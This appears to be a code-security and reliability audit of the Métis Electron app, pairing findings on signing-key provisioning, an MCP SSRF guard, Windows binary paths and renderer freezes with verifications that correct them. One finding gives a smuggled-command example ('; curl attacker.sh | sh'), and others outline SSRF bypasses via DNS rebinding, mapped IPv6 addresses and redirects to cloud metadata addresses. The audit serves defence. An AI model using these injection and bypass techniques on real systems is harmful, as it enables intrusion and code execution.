summary: This lane (auth, license, secrets, win-security, dust/CLI providers, operator client, MCP client, net egress/proxy, embedded Cloudflare/Cahê keys, outlook-write, desktop-adapters) is one of the most heavily self-audited parts of Métis -- nearly every file carries MQA-NNN markers from prior audit rounds and the security invariants each file declares (no shell:true, absolute-path Windows system-binary pinning, AES-GCM-with-KEK secret storage, admin-managed-config ACL trust with TOCTOU closure, SSRF/IMDS blocking, zip-slip-safe tarball extraction) are consistently upheld where they're declared. Real gaps that survived that scrutiny: (F1) the Operator skill-pack Ed25519 public key is never actually provisioned into any build this repo's electron-builder.yml can produce, so every packaged app verifies signed skill-overlay content against a checked-in DEV placeholder key rather than the real production key (either the feature silently never verifies real content, or the verification provides no real protection if it's ever relied on) -- and the license-lease public key (F7) has the identical unwired gap, currently harmless only because LICENSE_ENFORCEMENT is compiled off; (F2) the MCP client's cloud-metadata/SSRF guard resolves DNS once for validation and lets the actual connection re-resolve independently moments later, a classic DNS-rebinding TOCTOU that can walk a configured MCP endpoint past the IMDS block; (F3) license/device.ts spawns bare 'powershell.exe' (Windows CWD-hijack risk) in three places, violating the exact absolute-path invariant win-security.ts documents and fixes everywhere else in the codebase; (F4) auth.ts's background session revalidation checks domain and max-age drift but never re-checks the signed-in session's tenant ID against a later-rotated managed-config tenant. Several additional P2 architecture-consistency nits (F5, F6) are latent-but-not-currently-exploitable shell-construction/character-set inconsistencies relative to the file's own stated invariants. F8 (license enforcement off, embedded Cloudflare key obfuscation) is flagged per the audit brief but is already fully and honestly self-documented in-repo as a deliberate trade-off, not a newly discovered defect.

findings.title: Operator skill-pack signing key is never provisioned in packaging; every current build falls back to the committed DEV placeholder public key
findings.evidence: operator-skill-key.ts:16 defines DEV_OPERATOR_PUBLIC_KEY; getOperatorSkillPublicKeyRaw() (lines 33-35) falls back to it whenever process.resourcesPath/operator/pubkey.json is absent. Confirmed by search: resources/operator/ does not exist in the repo; electron-builder.yml's extraResources (top-level + mac + win blocks) never references operator/pubkey.json (unlike cloudflare-embed, cahe/kimi.json, and license-lease, which all have entries); scripts/before-pack.mjs and after-pack.mjs contain no reference to 'pubkey' or 'operator'; and unlike the sibling embedded-secret features, there is no check-operator-pubkey.mjs equivalent to check-embedded-cloudflare-key.mjs / check-cahe-package.mjs that would fail the build on a missing/placeholder key.
findings.failure_scenario: operator-overlay.ts's pullOperatorSkillManifest() runs whenever an Operator seat license/ingest secret is configured (operatorUrlConfigured() is true by default via shared/operator.ts's hardcoded DEFAULT_OPERATOR_URL, and startOperatorOverlayPoll() runs unconditionally at boot in index.ts). verifyOperatorSkillPack() checks each manifest entry's signature against getOperatorSkillPublicKeyRaw(), which is the DEV placeholder in every build produced by this repo's packaging config. Either every genuine signed pack from the real Worker (signed with its actual Wrangler-secret private key) silently fails verification forever (dead feature, no error surfaced), or -- if the Worker's response is ever compromised/poisoned -- the Ed25519 check provides no real protection because it isn't checking against the real production key at all.
findings.fix_direction: Add resources/operator/pubkey.json provisioning to electron-builder.yml's extraResources, write a scripts/check-operator-pubkey.mjs that fails the build if the packaged key equals DEV_OPERATOR_PUBLIC_KEY, and wire it into the same release path as check-embedded-cloudflare-key.mjs. Until fixed, disable overlay polling in packaged builds or treat a missing provisioned key as 'polling off'.

verification.evidence:
What holds up (seen in the code and on the installed app):
- src/main/operator-skill-key.ts:16 has the committed DEV_OPERATOR_PUBLIC_KEY. Lines 33-35 fall back to it whenever process.resourcesPath/operator/pubkey.json is missing.
- electron-builder.yml has no extraResources entry for operator/ (checked the top-level, mac and win blocks). The win and cahe yml files don't have one either.
- resources/operator/ does not exist.
- No check-*.mjs, before-pack.mjs, after-pack.mjs or release script mentions operator or pubkey.
- The installed /Applications/Metis.app/Contents/Resources/operator is absent (ls: No such file). The shipped 1.9.6 therefore verifies against the DEV key.
- The failure is silent. operator-overlay.ts:122-124: applySignedSkillPack returns false on a bad signature and logs nothing. Lines 107-112 count only successes. ~/Library/Logs/asktoto/main.log has zero "[operator]" lines, and audit.log has no operator events.

What does not hold up:
1. The security half is wrong. Checking against a key whose private half nobody has fails closed, so it is not "no real protection".
   - operator-skill-verify.ts:42-44 does a real Ed25519 verify(). Anything not signed by the private half of the embedded key is rejected (returns null).
   - The only PEM private key in the repo is a fake redaction string in src/main/llm/local-prewarm-messages.test.ts:63. No private key for the DEV public key is committed.
   - A poisoned or compromised Worker response therefore still cannot forge a pack.
   - Blast radius is also capped: operator-overlay.ts:125 (isOverlaySkillId) only allows the humanizer or built-in conversation-mode skill IDs.
2. "Every build = dead feature" can't be proven from here. operator/README.md:242 says the private key is a Wrangler secret and "The public half is committed in src/main/operator-skill-key.ts". That makes the committed key the intended production anchor, which contradicts the key file's own header (lines 6-8). Whether the live Wrangler secret matches the committed key is runtime state I can't inspect. If it matches, the feature works in current builds.
   - The Worker never checks this. operator/src/routes/admin-ctx.ts:23 declares OPERATOR_SKILL_PUBLIC_KEY but nothing reads it. Line 94 exposes only skillBound: Boolean(...).
3. The feature does not run by default.
   - Where the poll is gated: operator-overlay.ts:58 and :138 bail out unless resolveOperatorCredential() returns a seat license or ingest secret (shared/operator.ts:34-45). A default URL alone is not enough.
   - What it takes to trigger: the Worker only serves packs after an admin pushes one (operator/src/routes/admin-core.ts:104-124).
   - What I couldn't check: Tony's settings.json is encrypted, so I can't tell whether his seat has a credential.
4. One factual error: the finding says license-lease has an extraResources entry. It does not. The license-lease key is also unprovisioned (Resources/license-lease is absent from the installed app). Only cloudflare-embed (electron-builder.yml) and cahe/kimi.json (electron-builder.cahe.win.yml:22) are packaged.

This finding has nothing to do with Tony's two reports (heavy CPU/RAM; History freezing or crashing). The 6-hourly poll runs one HTTPS GET plus a verify.
verification.corrected_mechanism_or_fix:
Mechanism: this is key-provisioning drift plus a failure nobody can see. It is not a security hole. Packaging never ships a key, so clients always trust the committed key. Nothing checks that the Worker's OPERATOR_SKILL_PRIVATE_KEY is the private half of that key. If the two don't match, every pack an admin pushes is rejected on every seat. Nothing gets logged, and the admin console still says "pushed". Forgery stays blocked either way.

Fix, simplest first:
(1) Pick one trust anchor.
- If the committed key really is the production public half (as operator/README.md:242 says), rename it from DEV and fix the file header.
- If not, provision resources/operator/pubkey.json via extraResources, and add a release gate like check-embedded-cloudflare-key.mjs that fails when the packaged key is missing or equals the committed placeholder. Handle license-lease the same way; it has the same gap.
(2) Have the Worker derive the public key from its secret and include it in /health (or when a push is made). A release or ops check can then compare it with the client's bundled key.
(3) In pullOperatorSkillManifest, log a warning when data.skills.length > 0 but applied === 0 (for example "[operator] N packs rejected: signature/key mismatch"), so a mismatch shows up.
Do NOT disable polling. Failing closed is already the safe behavior.

findings.title: DNS-rebinding TOCTOU can bypass the MCP client's IMDS/SSRF guard
findings.evidence: validateEndpointUrl() (lines 89-127) resolves the hostname via dns.lookup (line 115) purely to check it against BLOCKED_HOSTS/link-local ranges. The actual connection in withClient() (line 185) builds StreamableHTTPClientTransport(new URL(endpointUrl), ...) from the same hostname string, which performs its own independent DNS resolution at connect time -- nothing pins the validated IP for the real request.
findings.failure_scenario: An attacker-controlled DNS name (TTL=0) configured as a BidStack/Plane MCP endpoint answers with a safe public IP for the validation lookup and a blocked address (e.g. 169.254.169.254) for the connect-time lookup moments later, letting the 'push' action (which carries the stored bearer API key) reach cloud metadata or another internal host despite the explicit BLOCKED_HOSTS/link-local check -- exactly the SSRF primitive the module's own comments say this guard exists to prevent.
findings.fix_direction: Resolve the hostname once, validate the resolved address, and force the actual connection to use that same pinned address (custom dns.lookup override on the fetch/agent, or connect-to the validated IP directly) instead of letting the transport re-resolve independently.

verification.evidence:
The mechanism is real, but P1 overstates it.

What checks out in the code:
- src/main/mcp/mcpClient.ts:89-128 (validateEndpointUrl). For a hostname that is not an IP, it runs dns.lookup(bareHost,{all:true}) with a 3 s timeout (lines 115-118). It rejects the URL only if a resolved address is in BLOCKED_HOSTS or 169.254/16 (line 119). It then returns null and keeps nothing about the addresses it resolved.
- withClient (172-216) builds `new StreamableHTTPClientTransport(new URL(endpointUrl), { requestInit: {headers, redirect:'error'} })` at line 185 with no `fetch` option. In SDK 1.29.0 (node_modules/@modelcontextprotocol/sdk/dist/cjs/client/streamableHttp.js:35,93,310,447) the transport calls `(this._fetch ?? fetch)`, so it falls back to the global undici fetch. That fetch resolves DNS again when it connects, so nothing pins the validated IP. The TOCTOU exists.
- It is reachable in production. connectMcp calls validateEndpointUrl at :262 and pushToMcp at :299. Callers are src/main/index.ts:5660, 5694, 5761, 5784 and 5902/5920 (user-configured BidStack/Plane URLs from Settings), and operator-integrations.ts:133/288 (baseUrl delivered by Operator).

Why P1 is too high:
1. The attacker has to control DNS for the configured endpoint hostname. Someone who controls that hostname already receives the bearer key and every pushed payload through normal use, so rebinding gives them no new access to the key.
2. The guard only blocks 169.254/16 plus a few literals. Localhost and private-LAN addresses are allowed on purpose (lines 43-47), so rebinding to LAN or loopback gains nothing.
3. There is no way for the attacker to read the metadata response. It is parsed locally as JSON-RPC, and failures go through classifyError (134-170) into generic messages shown only to the local user.
4. The request usually does not fit what metadata services require. The client sends POST JSON-RPC. AWS IMDSv1 accepts GET only, IMDSv2 needs a PUT token, and GCP and Azure need the Metadata-Flavor or Metadata header.
5. Métis is a macOS desktop app, and 169.254.169.254 has no metadata service on Tony's Mac. It only matters on cloud-hosted desktops.

So this is defense-in-depth hardening, not a P1.

Three related bypasses the reviewer missed. They are easier than the race and have the same limited impact:
(a) Fail-open. The catch at :122-125 lets the URL through when the lookup fails or takes longer than 3 s. A resolver that stalls the first query defeats the guard without any race.
(b) Resolved addresses are not normalized. Line 119 checks resolved addresses without ipv4MappedAddress(). A static AAAA record of ::ffff:169.254.169.254 is not caught, and nothing needs to change between lookups. This is inferred from the code; I did not run it against a live DNS record.
(c) The redirect guard does not cover the SDK's GET stream. When the server answers the initialized notification with 202, the SDK opens a GET SSE stream (streamableHttp.js:374-380 → _startOrAuthSse :82-96). That GET builds its own init `{method:'GET', headers, signal}` without spreading `_requestInit`, so `redirect:'error'` (mcpClient.ts:195) is not applied and fetch follows redirects. A malicious endpoint can answer that GET with a 302 to the metadata address, with no DNS tricks at all. undici drops Authorization on a cross-origin redirect, but user extraHeaders are carried over.
verification.corrected_mechanism_or_fix:
Corrected mechanism: validateEndpointUrl (mcpClient.ts:109-126) resolves the hostname once and keeps nothing. The transport built at :185 has no `fetch` option, so it uses the global undici fetch, which resolves the name again when it connects. On top of that race there are three easier bypasses:
- the check fails open on a lookup error or timeout (:122-125)
- resolved addresses are not normalized for IPv4-mapped IPv6 (:119)
- the SDK's GET SSE request never gets `redirect:'error'` (SDK streamableHttp.js:93-97)

Impact is limited. The attacker must already control the endpoint hostname, which means they already receive the key. LAN and localhost are allowed by design. The client cannot read the metadata response back to the attacker. The request method and headers don't match what metadata services require. Tony's Mac has no metadata service. Severity P3, hardening.

Fix, with the fewest moving parts: pass a custom `fetch` in the StreamableHTTPClientTransport options (opts.fetch is supported at SDK :35). Build it on undici, which is already a direct dependency (^7.29.0), using `new Agent({ connect: { lookup } })`. The custom `lookup` should:
- resolve the name once;
- reject if ANY answer is blocked, after normalizing IPv4-mapped IPv6 and including fd00:ec2::254;
- fail closed if the lookup errors or times out;
- hand back the same validated address, so validation and connection use one resolution.

The wrapper should also force `redirect: 'error'` on every request, whatever the method, so the SDK's GET stream is covered too. validateEndpointUrl stays as the early, user-friendly scheme and literal check. Add tests for: a mapped AAAA answer, a lookup timeout (must reject), and a GET that answers with a 302 (must reject).

findings.title: Bare 'powershell.exe' in license device-identity resolution (Windows CWD-hijack), inconsistent with the codebase's own pinned-path invariant
findings.evidence: winSerial() (lines 75, 82) and winModel() (line 92) call execFileSync('powershell.exe', [...]) with the bare executable name. win-security.ts's header (lines 25-34) documents this exact risk repo-wide and exports WINDOWS_POWERSHELL (an absolute System32 path) specifically so it holds everywhere; grep confirms only dust-secret-store.ts and foreground-watcher.ts actually use that pinned constant -- device.ts does not.
findings.failure_scenario: If Métis is launched with an attacker-writable current working directory (a shortcut with a controlled 'Start in' folder, a launch from a shared/Downloads directory), Windows CreateProcess's search order (own-install-dir, then cwd, before PATH) can execute a planted powershell.exe instead of the system one. Its output becomes this device's hardware-serial identity, which feeds hashDeviceId() and the member-license device binding used by license/activate.ts and license/jws.ts.
findings.fix_direction: Replace the three bare 'powershell.exe' call sites in device.ts with the exported WINDOWS_POWERSHELL constant from win-security.ts, matching the pattern already used elsewhere in the codebase.

verification.evidence:
Confirmed at origin/main 2bf21f1c:
- src/main/license/device.ts:75, :82 (winSerial) and :92 (winModel) call execText('powershell.exe', ...), which calls execFileSync (line 58) with the bare name, no shell.
- src/main/win-security.ts:24-34 documents the cwd-hijack risk and exports WINDOWS_POWERSHELL (the absolute System32 path, line 34) as "the ONE name any main-process module may use". The only users are dust-secret-store.ts:99, foreground-watcher.ts:113 and win-security.ts:124. device.ts is the only place in src/main that still passes a bare 'powershell.exe'. So the inconsistency is real.
- Reachability: activate.ts:30/:172 calls resolveDeviceIdentity(). statusFromCache (activate.ts:38-45) only resolves the device when a license cache exists. identitySnapshot is reached through the IPC handler at index.ts:5301, which only Settings.tsx and IdentitySection.tsx call. operator-ingest.ts:108 also calls it through memberLicenseStatus().

What the finding leaves out, and why it is overstated: src/main/index.ts:8891-8898 runs `if (process.platform === 'win32') { try { process.chdir(app.getPath('userData')) } ... }` early in whenReady. The comment there states it exists to defeat exactly this bare-name cwd-hijack class. After that line, the working directory is the user's own %APPDATA%\asktoto. Planting powershell.exe there takes same-user write access, which is already equivalent to code execution, so the "launched from Downloads / shortcut Start-in" scenario is mitigated.

Residual exposure:
(a) PATH-order hijack. This needs a user-writable directory ahead of System32 in PATH, which is unusual.
(b) A narrow window before the chdir. The early onboarding path (index.ts:8805-8812) calls registerIpc() and createWindow() before `await installProxyAwareFetch()` and the chdir. But identitySnapshot is only called from Settings, not from onboarding, so this window is theoretical.

Two mechanism corrections:
- The finding cites CreateProcess's search order (app dir, then cwd). Node actually resolves bare names through libuv's own search_path, which checks cwd and then PATH.
- If the hijack did succeed, the impact is arbitrary code execution as the user, not just a forged device identity.

The path is Windows-only and has nothing to do with Tony's macOS "heavy" or "History freeze" reports (E1-E9).
verification.corrected_mechanism_or_fix: Mechanism: bare-name resolution through libuv search_path (cwd, then PATH). It is largely neutralized by the win32 chdir to userData at src/main/index.ts:8897. What remains is a hardening and consistency gap against the repo's own invariant, not a practical P1. Fix, unchanged and minimal: in src/main/license/device.ts, `import { WINDOWS_POWERSHELL } from '../win-security'` and use it in place of 'powershell.exe' at lines 75, 82 and 92. Optionally, add a unit test or lint grep that fails on any bare 'powershell.exe' string literal under src/main, since win-security.test.ts:57-64 only checks the constant, not its callers.

findings.title: Background session revalidation never re-checks a signed-in session's tenant ID against a later tenant rotation
findings.evidence: expiryReason() (lines 483-487) checks max age and s.domain !== cfg.allowedDomain, but never s.tid !== cfg.tenantId. probeRefreshToken() (lines 500-524) calls acquireTokenSilent against the current cfg's authority, but a tenant-ID mismatch produces an error class that is not InteractionRequiredAuthError/invalid_grant/interaction_required, so it is classified 'unknown' (line 522) rather than 'revoked' -- and revalidateSession() (line 540) only clears the session on an explicit 'revoked' verdict.
findings.failure_scenario: IT rotates AZURE_TENANT_ID in managed-config (e.g. responding to a compromised tenant) while keeping the same allowed email domain. A device already signed in before the rotation keeps its cached session valid (per requireAuth()) for up to MAX_SESSION_AGE_MS (7 days), because neither the local expiry check nor the background probe treats a tenant mismatch as a reason to sign the user out.
findings.fix_direction: Add an `s.tid !== cfg.tenantId` branch to expiryReason() alongside the existing domain check, so a tenant-ID rotation forces the same fresh-sign-in path a domain change already triggers.

findings.title: resolveBin() builds a shell command string from an unvalidated `bin` parameter, contradicting the file's own 'no shell:true' invariant in spirit
findings.evidence: cli.ts's header (lines 4-10) declares 'No shell:true. All spawns pass args as an array' as a security invariant that must never relax. resolveBin() (line 243) does execFileAsync(shell, ['-lc', `command -v ${bin}`]), splicing `bin` into a string a login shell parses. Every current call site passes a hardcoded literal ('dust','npm','claude','codex', or cfg.bin from the static CLI_CONFIGS map) -- confirmed via grep across src/main -- so this is not exploitable today, but resolveBin(bin: string) itself has no allowlist/character validation on its parameter.
findings.failure_scenario: Any future caller that resolves a binary name sourced from Settings, a plugin/marketplace id, or an MCP-declared tool name reopens classic shell injection (e.g. bin containing '; curl attacker.sh | sh'), since resolveBin performs no validation on its input before splicing it into a shell -lc string.
findings.fix_direction: Restrict resolveBin's parameter to a small literal union (mirroring ManagedCliSpec['id']) so a free-text caller is a type error, or rewrite the lookup as execFileAsync(shell, ['-lc', 'command -v "$1"', '--', bin]) so bin is passed as a positional argument, never spliced into parsed shell text.

findings.title: loginScriptPathSafe()'s character blocklist is narrower than cmdShimSpawn's, for the same 'resolved bin path' argument this file already treats as needing the stricter check elsewhere
findings.evidence: cmdShimSpawn() (lines 335-376) rejects ["\r\n&|^%<>()!] in bin/args before spawning. loginScriptPathSafe() (lines 1507-1509), used by invokeResolvedBinLines() to build text lines of a login script later executed by a real shell/cmd.exe via shell.openPath/'start', only rejects ["\r\n%] -- a strict subset -- for the same kind of resolveBin()-resolved path value.
findings.failure_scenario: An install path containing a cmd.exe metacharacter such as '&', '|', or '(' (an unusual OneDrive-synced folder name, a corporate-imaged Program Files variant) would pass loginScriptPathSafe's check and land verbatim in a generated script line that a real shell later executes, even though the same character would be rejected by cmdShimSpawn's stricter check used for the direct spawn path.
findings.fix_direction: Extract cmdShimSpawn's metacharacter set into a shared constant and reuse it in loginScriptPathSafe so both 'is this resolved bin path safe to embed' checks in the file apply the same bar.

findings.title: License-lease public key has the identical missing-provisioning gap as F1, currently inert only because LICENSE_ENFORCEMENT is compiled off

findings.title: guardReviewNav's blocking window.confirm() (History-freeze mechanism) confirmed in this lane's file
findings.evidence: App.tsx:915-921: guardReviewNav calls window.confirm(...) synchronously on the overlay's frameless/transparent/always-on-top/no-Dock-icon window; every History-open path (onBarHistory App.tsx:2732-2740, Escape-from-Review App.tsx:3143-3163) routes through it. This is the exact mechanism lane B1 root-caused independently from the main-process side (see B1-history-freeze.md secs 2-3, which also cites App.tsx:2765,2792,3143 and Review.tsx:430 as duplicated guard sites I did not re-verify line-by-line this pass).
findings.failure_scenario: User edits a recap in Review (reviewDirtyRef=true), clicks History or presses Escape; window.confirm() blocks the renderer JS thread with a native dialog that has nothing to visibly attach to on this frameless always-on-top window -- the app is alive but permanently unresponsive, matching Tony's 'running but it just freezes' report exactly.
findings.fix_direction: Ban window.confirm/alert/prompt from the renderer (contract test + lint rule); replace the ~8 call sites with an in-DOM React confirm modal. Treat as ONE ticket shared with lane B1 (fix touches both App.tsx/Review.tsx here and src/main/index.ts's unresponsive-handler/ensureWindow() recovery path there).

verification.evidence:
I read everything below myself at HEAD 2bf21f1c, working read-only.

What holds:
1. src/renderer/src/App.tsx:915-921 does define guardReviewNav, and the synchronous window.confirm call is on line 916.
2. onBarHistory (App.tsx:2732-2740) routes through guardReviewNav.
3. The Escape-from-Review path (App.tsx:3143) has its own inline window.confirm. It does not call guardReviewNav.
4. The overlay window is created at src/main/index.ts:2580-2618 with frame:false and transparent: chrome.transparent (sometimes transparent, not always). applyOverlayAlwaysOnTop (index.ts:2512-2519) sets it to 'screen-saver' level. electron-builder.yml:227 sets LSUIElement:true. Electron is 43.6.0. Nothing sets disableDialogs.

What does not hold:
(a) The claim that the dialog has "nothing to visibly attach to" is wrong. Electron's JS dialog manager passes the calling WebContents' owner window (the overlay `win`) as the parent. On macOS, when that parent is visible, the alert opens as a sheet attached to it via beginSheetModalForWindow. The repo comment the finding leans on (index.ts:8434-8439, recapPdf) is about dialogs opened with NO parent window, which is a different case. Whether the sheet can end up off-screen or unreachable here is UNVERIFIED. The most believable way it could happen is DERIVED: in the Hide/Island hover layouts, the main process's cursor-watch can shrink the parent window to a hairline at the top of the screen and make it click-through (parkOverlayAfterHideSpring, index.ts:3244-3275). It does this without the renderer, so it can happen while the renderer is blocked. Nobody has reproduced this.
(b) "Every History-open path" hits the confirm is overstated. The confirm only fires when view==='review' AND the recap editor is open AND the draft differs from the recap (Review.tsx:417: recapDirty = editingRecap && recapDraft !== recapText; editingRecap is only set by the explicit Edit action, startEditRecap at Review.tsx:432-436). Clicking History from the idle bar, an answer or Settings is a straight pass-through. So this cannot be the general mechanism behind Tony's History freeze reports. At most it covers the rare case where he was mid-edit on a recap.
(c) "Permanently unresponsive" is not proven. If the sheet is visible, clicking a button unblocks it. Also, Chromium pauses its hang monitor while a JS dialog is open (an open alert() never triggers "Page Unresponsive"). So a renderer stuck in confirm would not emit app.unresponsive. That means the E6 entry (render-process-gone killed/15, then app.unresponsive 5 s later) is not evidence for this mechanism. It also means the B1 companion fixes (a timeout on 'unresponsive', and isResponsive() in ensureWindow/second-instance) would NOT detect a renderer stuck on a dialog.
(d) The count is wrong. There are 9 native dialog calls, not "~8" confirms. Seven are window.confirm: App.tsx:916, 2765, 2792, 3143; Review.tsx:430; Settings.tsx:6347, 7524. Two are window.alert: App.tsx:3411 (inside the History/RecallView onOpenFolder handler) and App.tsx:3532. The alert at 3411 is the only native dialog on the History screen that does not need an unsaved recap edit, but it only fires if opening the meetings folder returns an error.

Net assessment: the code is real and reachable in production. Native blocking dialogs in a borderless, always-on-top, no-Dock-icon overlay are a real reliability risk. But the path needs an uncommon precondition, the "invisible dialog" claim is untested, and the evidence does not support calling it the P0 root cause of the History freeze.
verification.corrected_mechanism_or_fix:
Corrected mechanism (DERIVED, not observed): window.confirm and window.alert block the overlay renderer's main thread while a native sheet is attached to the overlay window. Normally the user can see and dismiss that sheet. It becomes a hard freeze only if the sheet can't be seen or reached. The likeliest way is the main-process hover-park in the Hide/Island layouts, which shrinks the parent window to a click-through hairline at the top of the screen (index.ts:3244-3275). The trigger for the confirms is narrow: Review is open, the recap editor is open, and the draft has changed. Then the user clicks History, Settings, minimize, collapse, Escape or a hotkey (App.tsx:916/2765/2792/3143, Review.tsx:430). It does not explain History freezes that start from the idle bar or an answer view. Look for another root cause there, for example the lazy-loaded RecallView chunk, the main-process work in recall list/search, or the relaunch/second-instance handling.

Fix: keep the lane's direction and widen its scope. (1) Replace all 9 native dialog calls (7 window.confirm plus the 2 window.alert at App.tsx:3411/3532) with one shared in-page React confirm/toast component. Add a contract test that greps src/renderer for window.(alert|confirm|prompt)( and fails on any match, plus a lint rule. (2) Don't rely on the B1 'unresponsive' timeout or isResponsive() recovery to catch this. Chromium pauses the hang monitor while a JS dialog is open, so those signals never fire for this failure. Removing the blocking dialogs is the only real fix for this path. (3) Before calling this the root cause, reproduce it on Tony's Mac in both the Bar and Island/Hide layouts: edit a recap, then click History and move the cursor away. Record whether the sheet stays visible and can be clicked. Track it as a P2 reliability hardening ticket, not as the P0 root cause of the History freeze.

findings.title: Live-transcript state lives inside the 4,277-line God Component, so every transcribed word re-runs the whole App() function
findings.evidence: lib/listen.ts:804 declares const [lines, setLines] = useState<TranscriptLine[]>([]) inside useListen(); setLines fires on every committed line (listen.ts:1021,1034,1048,1102,1481,2342). App.tsx:405 calls const listen = useListen(...) directly inside App()'s own body (not a child component), so each setLines re-renders the entire enclosing 4,277-line function: all 65 useCallback factories, 8 useMemo dep-checks, and 47 effect dep-comparisons re-execute on the JS thread once per transcribed line.
findings.failure_scenario: During an actively-talkative meeting (the app's core use case), each transcribed line pays the JS-execution cost of re-running the entire App() function body, several times a second per App.tsx:949-953's own comment about listen.lines changing on every line -- a renderer-JS-thread-level contributor to 'it's very heavy on the PC' that is additive to, and distinct from, lane B2's process/sidecar-level findings (B2 explicitly scoped to main-process consumers).
findings.fix_direction: Move useListen()'s state ownership into its own component boundary (e.g. a thin <MeetingSession/> wrapper) so a transcript-line update only re-renders that subtree, not all of App(); or land the decomposition plan in the report so the enclosing function is much smaller.

verification.evidence:
The mechanism is real. I checked it myself at HEAD.
- src/renderer/src/lib/listen.ts:804 declares `const [lines, setLines] = useState<TranscriptLine[]>([])`.
- setLines fires at 1021 (beginProvisional adds the "…" placeholder), 1034 (clearProvisional), 1048 (attachSpeakerName), 1102 (commitLine), and 1481 and 2342 (echo-drop). So one decode window causes 2 to 3 renders, and streaming partials add more.
- listen.ts:3148-3152 returns `useMemo(() => ({...state, lines, ...}), [state, lines, ...])`, so the `listen` object gets a new identity on every line.
- App.tsx:405 calls `useListen(...)` directly inside `export function App()`. App runs from line 267 to the end of the file at 4277, and no other component is defined after it. The counts hold: 65 useCallback, 8 useMemo, 47 useEffect, all inside App. React is 18.3.1 with @vitejs/plugin-react and no React Compiler (package.json:124, electron.vite.config.ts:90), so every setLines re-runs the whole App body.

Why P1 is overstated:
1. The cascade stops early. The expensive children are wrapped in `memo`: Bar (Bar.tsx:338), Copilot (Copilot.tsx:55) with per-row TranscriptRow (Copilot.tsx:23), Answer (Answer.tsx:45), Review (Review.tsx:222), QuickActions and OverlayPeek. copilotBody (App.tsx:3451-3469) and reviewBody (App.tsx:3471-3579) are useMemo'd.
2. The work App does on each line is small:
   - It re-runs the hook bookkeeping and creates the ~420 lines of JSX in its return (App.tsx:3858+).
   - It re-renders a few small toasts that get inline arrow props.
   - It re-runs these effects, all cheap:
     - App.tsx:1071 exits early unless view==='review'.
     - App.tsx:1819 and 1856 are watermark or time guards.
     - App.tsx:1304 is the honk check; detectNoDecisionEnding (src/shared/wrapup.ts:91) is gated on a 10-line minimum and scans only the last ENDING_WINDOW_LINES unless a cue matches.
   At a few renders per second, that is plausibly around 1% of one core. That is an estimate; nobody has profiled it. None of E1-E9 points at the renderer's JS thread. The render-process-gone record has reason=killed with exitCode=15, which is a SIGTERM, not CPU or memory pressure. This finding does not explain the History freeze.
3. Transcript lines are not the most frequent reason App re-renders. All seven useAsk instances (ask, suggest, coaching, booking, recapGen, speculative, followup) keep their state inside App. useAsk (src/renderer/src/state.ts:263-343) flushes streamed tokens once per requestAnimationFrame, so App re-renders at up to about 60 Hz during any stream. That includes the hidden `speculative` shadow suggestion, which App.tsx:1819-1850 starts every suggestEverySec (default 8 s) while the other side is talking. It re-renders App even though Copilot skips it, because showSpec is false.
4. The real cost triggered from the renderer is the work those effects launch, not the React renders. Speculative suggest runs actual LLM inference roughly every 8 s during a meeting, and App.tsx:1856-1866 calls `window.toto.localPrewarm(listen.text().slice(-6000))` about every 5 s. On a local setup (E1: 3.3 GB GGUF llama-server) that is much heavier than re-running App().
verification.corrected_mechanism_or_fix:
Corrected mechanism: App() re-renders on every transcript line, confirmed. That cost is small because the heavy children are already memoized. The bigger re-render driver is the per-frame (up to about 60 Hz) useAsk token flush for all seven useAsk instances hosted in App, including the invisible background `speculative` stream. The work that plausibly contributes to "heavy on the PC" from the renderer is the LLM inference those effects start: speculative suggest about every 8 s (App.tsx:1819) and local prewarm about every 5 s (App.tsx:1856), not the React re-render itself.

Why the proposed fix fails as written: a thin <MeetingSession/> wrapper does not work, because about 12 App hooks read listen.lines. These are manualSave, the review autosave effect, factCheck, the speculative and prewarm effects, startListen, maybeFireRecap, persistLiveMeetingOnExit, flushLiveMeeting, reset, the honk effect, copilotBody and reviewBody. Moving the state down would just move the re-render.

Workable fix for the 2.0 decomposition:
1. Expose lines as an external store (a ref plus subscribe, read with useSyncExternalStore). Only Copilot and the review transcript subscribe. App's callbacks read `listen.text()` or linesRef on demand. The line-driven effects (speculative, prewarm, honk) become store subscriptions or a single throttled tick.
2. Move the speculative useAsk into its own component, or keep its streamed text in a ref until adoption, so background streams stop re-rendering App.
3. Separately, and more important for the heavy-PC report: review the speculative and prewarm cadence when the provider is local. Examples: turn off instantSuggestions or prewarm by default on local-only installs, or raise suggestEverySec.

This is P3 structural and performance hygiene that fits the simplification goal. It is not a cause of either reported bug, and a profiler trace should back it before it is ranked higher.

verification.evidence:
Checked read-only against 2bf21f1c.

What holds up:
- package.json has no virtualization dependency. A grep of src/renderer finds no react-window, react-virtual, useVirtualizer or content-visibility.
- Review.tsx:1858-1882: when the transcript panel is open it renders every entry of speechLines, with no inner scroll and no cap.
- RecallView.tsx:465 sets INITIAL_RENDER_CAP=100. Lines 1165 and 1290-1298 show that "Show all N meetings" removes the cap.
- BrainView.tsx:696-704: `deals` is sorted but never sliced, and line 1328 renders all of it.
- BrainRecordPage.tsx:810 renders the whole `meetings` timeline, while mergeCandidates at line 724 is cut to .slice(0,30).

What is wrong or overstated:
1. The people list is capped. BrainView.tsx:706-709 defines `people` as sort(...).slice(0, 6), so line 1349 renders at most 6 rows. The claim that people renders uncapped is false.
2. The transcript is collapsed by default. Review.tsx:335 sets transcriptOpen from the showTranscript prop. App.tsx:3516 passes settings.showFullTranscriptInReview ?? false, and shared/ipc.ts:1142 defaults that setting to false. By default the user sees a "Show Transcript" button (Review.tsx:1827-1839), and the full list mounts only after a click.
3. History does not render an unbounded list by default. History maps to RecallView (App.tsx:2737, 3405). It caps the first render at 100 rows (RecallView.tsx:1161-1175) and uses a memoized MeetingRow. In the main process, listMeetings uses a per-file cache keyed on mtime and size (recall.ts readCache), so it does not re-read and re-decrypt every file.
4. Tony's real data is far too small to cause a freeze, measured read-only with counts only:
   - ~/Library/CloudStorage/OneDrive-MantuGroup/Métis Meetings has 59 meeting .md files. That is under the cap of 100, so the "Show all" button never even appears.
   - The .brain/entities folder has 12 deals, 20 people and 8 accounts.
   - The largest meeting file is 28 KB and encrypted (ATKE header), which works out to a few hundred transcript lines at most.
   - Every list in this finding therefore mounts somewhere between tens and a few hundred simple rows. That takes milliseconds, not the multi-second stall needed to explain E3 or E6.
5. The E6 evidence points elsewhere. render-process-gone reason=killed exitCode=15 is an external SIGTERM, not a renderer that hung or ran out of memory from too many DOM nodes. The app.unresponsive event (index.ts:2722-2725) fired 5 seconds after that kill and relates to the overlay window. Nothing ties either event to rendering a list.

